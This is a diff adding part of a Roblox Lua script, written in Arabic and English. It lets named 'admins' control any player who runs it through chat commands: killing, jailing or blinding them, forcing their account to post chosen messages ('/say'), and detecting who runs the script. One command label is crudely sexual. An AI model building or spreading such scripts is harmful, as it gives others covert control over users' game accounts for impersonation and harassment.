+function Commands.unscream(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.scream = false
+    reapplyPersistent()
+end
+
+function Commands.check(admin, target)
+    if target and target:lower() == "all" then
+        pcall(function()
+            if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+                TextChatService.TextChannels.RBXGeneral:SendAsync("✅")
+            else
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("✅", "All")
+            end
+        end)
+    elseif target then
+        if amILocalTarget(target) then
+            pcall(function()
+                if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+                    TextChatService.TextChannels.RBXGeneral:SendAsync("✅")
+                else
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("✅", "All")
+                end
+            end)
+        end
+    else
+        pcall(function()
+            if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+                TextChatService.TextChannels.RBXGeneral:SendAsync("✅")
+            else
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("✅", "All")
+            end
+        end)
+    end
+end
+
+function Commands.fun(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.fun = true
+    reapplyPersistent()
+end
+
+function Commands.unfun(admin, target)
+    if not amILocalTarget(target) then 
+        return 
+    end
+    persistent.fun = false
+    reapplyPersistent()
+end
+
+-- ===== أوامر التاج (إخفاء/إظهار) =====
+function Commands.untag(admin, target)
+    if not amILocalTarget(target) then return end
+    tagVisible = false
+    for player, tag in pairs(ownerTags) do
+        pcall(function() if tag then tag.Enabled = false end end)
+    end
+    for player, tag in pairs(adminTags) do
+        pcall(function() if tag then tag.Enabled = false end end)
+    end
+    addMessage("SYSTEM", "🏷️ تم إخفاء التاج")
+end
+
+function Commands.tag(admin, target)
+    if not amILocalTarget(target) then return end
+    tagVisible = true
+    for player, tag in pairs(ownerTags) do
+        pcall(function() if tag then tag.Enabled = true end end)
+    end
+    for player, tag in pairs(adminTags) do
+        pcall(function() if tag then tag.Enabled = true end end)
+    end
+    addMessage("SYSTEM", "🏷️ تم إظهار التاج")
+end
+
+-- ===== أوامر حصرية لـ # =====
+function Commands.jail(admin, target)
+    if not canUseJailCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر حصري للأدمن المميزين (#)")
+        return
+    end
+    if not target then 
+        return 
+    end
+    
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    local targetPlayer = findPlayerByPartial(target)
+    if not targetPlayer then 
+        return 
+    end
+    local success = createJailForPlayer(targetPlayer)
+    if success then
+        addMessage("SYSTEM", "🔒 " .. targetPlayer.Name .. " تم سجنه")
+    end
+end
+
+function Commands.unjail(admin, target)
+    if not canUseJailCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر حصري للأدمن المميزين (#)")
+        return
+    end
+    if not target then 
+        return 
+    end
+    
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    local targetPlayer = findPlayerByPartial(target)
+    if not targetPlayer then 
+        return 
+    end
+    removeJail(targetPlayer.Name)
+    addMessage("SYSTEM", "🔓 " .. targetPlayer.Name .. " تم إطلاق سراحه")
+end
+
+function Commands.say(admin, target, ...)
+    if not canUseJailCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر حصري للأدمن المميزين (#)")
+        return
+    end
+    if not target then 
+        return 
+    end
+    
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    if not amILocalTarget(target) then
+        return
+    end
+    local message = table.concat({...}, " ")
+    if message == "" then 
+        return 
+    end
+    pcall(function()
+        if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
+        else
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+        end
+    end)
+    addMessage("SYSTEM", "📝 " .. admin .. " جبرك تكتب: \"" .. message .. "\"")
+end
+
+function Commands.cuffs(admin, target)
+    if not canUseCuffsCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر حصري للأدمن المميزين (#)")
+        return
+    end
+    if not target then 
+        return 
+    end
+    
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    local targetPlayer = findPlayerByPartial(target)
+    if not targetPlayer then
+        addMessage("SYSTEM", "❌ لم يتم العثور على اللاعب")
+        return
+    end
+    local adminPlayer = Players:FindFirstChild(admin)
+    if not adminPlayer then
+        addMessage("SYSTEM", "❌ الأدمن غير موجود")
+        return
+    end
+    local success = createCuffsForPlayer(targetPlayer, adminPlayer)
+    if success then
+        addMessage("SYSTEM", "🔗 " .. targetPlayer.Name .. " تم تقييده بالكف")
+    end
+end
+
+function Commands.uncuffs(admin, target)
+    if not canUseCuffsCommand(admin) then
+        addMessage("SYSTEM", "❌ هذا الأمر حصري للأدمن المميزين (#)")
+        return
+    end
+    if not target then 
+        return 
+    end
+    
+    if isTargetProtected(target) then
+        addMessage("SYSTEM", "❌ لا يمكنك استخدام هذا الأمر على " .. target)
+        return
+    end
+    
+    local targetPlayer = findPlayerByPartial(target)
+    if not targetPlayer then
+        addMessage("SYSTEM", "❌ لم يتم العثور على اللاعب")
+        return
+    end
+    local success = removeCuffsFromPlayer(targetPlayer)
+    if success then
+        addMessage("SYSTEM", "🔓 " .. targetPlayer.Name .. " تم إطلاق سراحه من الكف")
+    end
+end
+
+-- ===== GUI لأمر /cmd bar (عربي وإنجليزي) =====
+function Commands.cmd(admin, target)
+    if not amILocalTarget(target) then return end
+    
+    local oldGui = LocalPlayer.PlayerGui:FindFirstChild("CommandsGUI")
+    if oldGui then oldGui:Destroy() end
+    
+    local commandsGui = Instance.new("ScreenGui")
+    commandsGui.Name = "CommandsGUI"
+    commandsGui.ResetOnSpawn = false
+    commandsGui.Parent = LocalPlayer.PlayerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 450, 0, 500)
+    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -250)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = commandsGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 45)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
+    title.BorderSizePixel = 0
+    title.Text = "📋 Commands List | قائمة الأوامر"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = mainFrame
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 12)
+    titleCorner.Parent = title
+
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 35, 0, 35)
+    closeButton.Position = UDim2.new(1, -40, 0, 5)
+    closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+    closeButton.BorderSizePixel = 0
+    closeButton.Text = "✕"
+    closeButton.TextColor3 = Color3.new(1, 1, 1)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 16
+    closeButton.Parent = mainFrame
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 8)
+    closeCorner.Parent = closeButton
+
+    local scrollFrame = Instance.new("ScrollingFrame")
+    scrollFrame.Size = UDim2.new(1, -15, 1, -60)
+    scrollFrame.Position = UDim2.new(0, 7, 0, 52)
+    scrollFrame.BackgroundTransparency = 1
+    scrollFrame.BorderSizePixel = 0
+    scrollFrame.ScrollBarThickness = 6
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scrollFrame.Parent = mainFrame
+
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Padding = UDim.new(0, 4)
+    listLayout.Parent = scrollFrame
+
+    -- قائمة الأوامر (عربي وإنجليزي)
+    local commandsList = {
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "🟢 GENERAL COMMANDS | أوامر عامة",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "/kill [name] - Kill a player | قتل لاعب",
+        "/kick [name] [reason] - Kick a player with reason | طرد لاعب مع سبب",
+        "/bring [name] - Bring a player to you | جلب لاعب إليك",
+        "/teleportto [name] - Teleport to a player | الانتقال إلى لاعب",
+        "/freeze [name] - Freeze a player | تجميد لاعب",
+        "/unfreeze [name] - Unfreeze a player | فك التجميد",
+        "/speed [name] [value] - Change player speed | تغيير السرعة",
+        "/resetSpeed [name] - Reset player speed | إعادة السرعة",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "🔵 EFFECT COMMANDS | أوامر التأثيرات",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "/vanish [name] - Become invisible | اختفاء",
+        "/unvanish [name] - Become visible | ظهور",
+        "/noclip [name] - Toggle noclip | اختراق الجدران",
+        "/blind [name] - Blind a player | تعمية لاعب",
+        "/unblind [name] - Unblind a player | إعادة البصر",
+        "/flash [name] - Flash effect | تأثير فلاش",
+        "/unflash [name] - Remove flash | إزالة الفلاش",
+        "/dance [name] - Make player dance | جعل اللاعب يرقص",
+        "/undance [name] - Stop dancing | إيقاف الرقص",
+        "/spin [name] - Make player spin | جعل اللاعب يدور",
+        "/unspin [name] - Stop spinning | إيقاف الدوران",
+        "/scream [name] - Scream effect | تأثير الصراخ",
+        "/unscream [name] - Stop scream | إيقاف الصراخ",
+        "/milk [name] - Milk effect | تأثير الحليب",
+        "/unmilk [name] - Remove milk | إزالة الحليب",
+        "/slow [name] - Slow down player | إبطاء لاعب",
+        "/unslow [name] - Remove slow | إزالة الإبطاء",
+        "/nohair [name] - Remove hair | إزالة الشعر",
+        "/rehair [name] - Restore hair | إعادة الشعر",
+        "/fling [name] - Fling a player | قذف لاعب",
+        "/fun [name] - Fun mode | وضع المرح",
+        "/unfun [name] - Normal mode | وضع طبيعي",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "🔴 CHAT COMMANDS | أوامر الشات",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "/dchat [name] - Disable chat | تعطيل الشات",
+        "/rchat [name] - Enable chat | تفعيل الشات",
+        "/yassin [name] - Say Yassin Ami | يقول ياسين عمي",
+        "/check [name] - Check if script is active | التحقق من السكربت",
+        "/check all - Check all players | التحقق من جميع اللاعبين",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "🟠 TAG COMMANDS | أوامر التاج",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "/tag [name] - Show admin tag | إظهار التاج",
+        "/untag [name] - Hide admin tag | إخفاء التاج",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "🟣 VIP COMMANDS (#) | أوامر الأدمن المميزين",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "/jail [name] - Jail a player | سجن لاعب",
+        "/unjail [name] - Unjail a player | إطلاق سراح",
+        "/cuffs [name] - Handcuff a player | تقييد لاعب",
+        "/uncuffs [name] - Remove handcuffs | فك التقييد",
+        "/say [name] [message] - Force player to say | إجبار على الكتابة",
+        "/ban [name] - Ban player (lay down) | حظر لاعب (تثبيت)",
+        "/unban [name] - Unban player | إلغاء الحظر",
+        "",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "📖 OTHER | أخرى",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "/cmd bar - Show this menu | عرض هذه القائمة",
+        "/cmds - Show old commands menu | عرض قائمة الأوامر القديمة",
+        "",
+        "✨ Usage | طريقة الاستخدام: /command name",
+        "💡 Example | مثال: /kill Lol21536544"
+    }
+
+    for _, text in pairs(commandsList) do
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, -10, 0, 18)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = text
+        textLabel.Font = Enum.Font.Gotham
+        textLabel.TextSize = 12
+        textLabel.TextXAlignment = Enum.TextXAlignment.Left
+        textLabel.Parent = scrollFrame
+        
+        if text:find("━━━") then
+            textLabel.TextColor3 = Color3.fromRGB(100, 100, 150)
+            textLabel.TextSize = 10
+        elseif text:find("🟢") then
+            textLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            textLabel.TextSize = 14
+        elseif text:find("🔵") then
+            textLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
+            textLabel.TextSize = 14
+        elseif text:find("🔴") then
+            textLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+            textLabel.TextSize = 14
+        elseif text:find("🟠") then
+            textLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
+            textLabel.TextSize = 14
+        elseif text:find("🟣") then
+            textLabel.TextColor3 = Color3.fromRGB(200, 100, 255)
+            textLabel.TextSize = 14
+        elseif text:find("✨") or text:find("💡") then
+            textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+            textLabel.TextSize = 12
+        else
+            textLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+        end
+    end
+
+    task.wait(0.1)
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
+
+    closeButton.MouseButton1Click:Connect(function() commandsGui:Destroy() end)
+end
+
+-- ===== GUI القديم للأوامر (cmds) =====
+function Commands.cmds(admin, target)
+    if not game:IsLoaded() then game.Loaded:Wait() end
+    repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui")
+    
+    local oldGui = LocalPlayer.PlayerGui:FindFirstChild("CommandsGUI")
+    if oldGui then oldGui:Destroy() end
+    
+    local commandsGui = Instance.new("ScreenGui")
+    commandsGui.Name = "CommandsGUI"
+    commandsGui.ResetOnSpawn = false
+    commandsGui.Parent = LocalPlayer.PlayerGui
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 300, 0, 350)
+    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = commandsGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
+    title.BorderSizePixel = 0
+    title.Text = "🎮 جميع الأوامر"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.Parent = mainFrame
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 10)
+    titleCorner.Parent = title
+
+    local closeButton = Instance.new("TextButton")
+    closeButton.Size = UDim2.new(0, 30, 0, 30)
+    closeButton.Position = UDim2.new(1, -35, 0, 5)
+    closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+    closeButton.BorderSizePixel = 0
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.new(1, 1, 1)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 14
+    closeButton.Parent = mainFrame
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 6)
+    closeCorner.Parent = closeButton
+
+    local scrollFrame = Instance.new("ScrollingFrame")
+    scrollFrame.Size = UDim2.new(1, -10, 1, -50)
+    scrollFrame.Position = UDim2.new(0, 5, 0, 45)
+    scrollFrame.BackgroundTransparency = 1
+    scrollFrame.BorderSizePixel = 0
+    scrollFrame.ScrollBarThickness = 6
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    scrollFrame.Parent = mainFrame
+
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Padding = UDim.new(0, 3)
+    listLayout.Parent = scrollFrame
+
+    local commandsContent = {
+    "🎯 طريقة الاستخدام: /الأمر اسم_اللاعب",
+    "🎯 أو: /check all",
+    "",
+    "⚔️ أوامر أساسية:",
+    "  /kill [اسم] - يقتله",
+    "  /kick [اسم] [سبب] - يطرده مع سبب",
+    "  /bring [اسم] - يجيبه عندك",
+    "  /freeze [اسم] - يثبّته",
+    "  /unfreeze [اسم] - يفك التثبيت عنه",
+    "",
+    "🚀 حركة:",
+    "  /teleportto [اسم] - تروح له",
+    "  /fling [اسم] - يطيره",
+    "  /speed [اسم] [رقم] - يغيّر سرعته",
+    "  /slow [اسم] - يبطّيه",
+    "  /unslow [اسم] - يرجّع سرعته",
+    "",
+    "🔇 الشات:",
+    "  /dchat [اسم] - يكتمه",
+    "  /rchat [اسم] - يفك الكتم عنه",
+    "",
+    "🎭 تأثيرات:",
+    "  /blind [اسم] - يعميه",
+    "  /unblind [اسم] - يرجّع نظره",
+    "  /flash [اسم] - فلاش عليه",
+    "  /unflash [اسم] - يشيل الفلاش",
+    "",
+    "👻 تأثيرات على لاعب:",
+    "  /vanish [اسم] - يخليه يختفي",
+    "  /unvanish [اسم] - يطلع",
+    "  /noclip [اسم] - يخليه يمشي داخل الجدران",
+    "  /fun [اسم] - حركة معكوسة",
+    "  /unfun [اسم] - حركة طبيعية",
+    "  /dance [اسم] - يخليه يرقص",
+    "  /undance [اسم] - يوقف الرقص",
+    "  /spin [اسم] - يخليه يلف",
+    "  /unspin [اسم] - يوقف اللف",
+    "  /scream [اسم] - يخليه يصيح",
+    "  /unscream [اسم] - يخليه يسكت",
+    "  /milk [اسم] - ينزل منوي",
+    "  /unmilk [اسم] - يشيل المنوي",
+    "  /nohair [اسم] - يشيل شعره",
+    "  /rehair [اسم] - يرجّع شعره",
+    "",
+    "🏷️ التاج:",
+    "  /tag [اسم] - يظهر التاج",
+    "  /untag [اسم] - يخفي التاج",
+    "",
+    "✨ أوامر عامة:",
+    "  /check [اسم] - يشيّك إذا اللاعب مفعّل السكربت",
+    "  /check all - يطلع لك كل اللاعبين",
+    "  /yassin [اسم] - يخليه يقول: ياسين عمي",
+    "  /cmd bar - يفتح قائمة الأوامر المترجمة",
+    "  /cmds [اسم] - يفتح هذه القائمة"
+}
+
+    for _, text in pairs(commandsContent) do
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 0, 15)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = text
+        textLabel.Font = Enum.Font.Gotham
+        textLabel.TextSize = 10
+        textLabel.TextXAlignment = Enum.TextXAlignment.Left
+        textLabel.Parent = scrollFrame
+        
+        if text:find("🎯") then textLabel.TextColor3 = Color3.fromRGB(255, 150, 50)
+        elseif text:find("⚔️") then textLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        elseif text:find("🚀") then textLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
+        elseif text:find("🔇") then textLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+        elseif text:find("🎭") then textLabel.TextColor3 = Color3.fromRGB(200, 100, 255)
+        elseif text:find("👻") then textLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        elseif text:find("🏷️") then textLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
+        elseif text:find("✨") then textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+        else textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) end
+    end
+
+    task.wait(0.1)
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y)
+
+    closeButton.MouseButton1Click:Connect(function() commandsGui:Destroy() end)
+end
+
+task.wait(3)
+local rank = getAdminRank(LocalPlayer.Name)
+if rank then 
+    Commands.cmds("system", "all") 
+end
+
+-- ===== نظام الشات =====
+local lastMessage = ""
+local function setupChatSystem()
+    pcall(function()
+        local function handleChat(player, msg)
+            if lastMessage ~= msg then
+                lastMessage = msg
+                if not persistent.nospeak then 
+                    addMessage(player.Name, msg) 
+                end
+                
+                local rank = getAdminRank(player.Name)
+                if rank then
+                    if msg:sub(1,1) == "/" then
+                        local parts = {}
+                        for w in msg:gmatch("%S+") do 
+                            table.insert(parts, w) 
+                        end
+                        local cmd = parts[1] and parts[1]:sub(2)
+                        local targ = parts[2]
+                        local extra = {}
+                        for i=3, #parts do 
+                            table.insert(extra, parts[i]) 
+                        end
+                        
+                        if cmd and Commands[cmd] then
+                            if targ and (targ:lower() == "all" or amILocalTarget(targ)) then
+                                pcall(function() 
+                                    Commands[cmd](player.Name, targ, table.unpack(extra)) 
+                                end)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        for _, player in ipairs(Players:GetPlayers()) do 
+            player.Chatted:Connect(function(msg) 
+                handleChat(player, msg) 
+            end) 
+        end
+        Players.PlayerAdded:Connect(function(player) 
+            player.Chatted:Connect(function(msg) 
+                handleChat(player, msg) 
+            end) 
+        end)
+    end)
+end
+
+-- ===== تشغيل النظام =====
+setupChatSystem()
+reapplyPersistent()
+
+-- التحقق من الصلاحية عند دخول اللعبة
+task.wait(2)
+checkAndShowAdminStatus()
+print("done") 
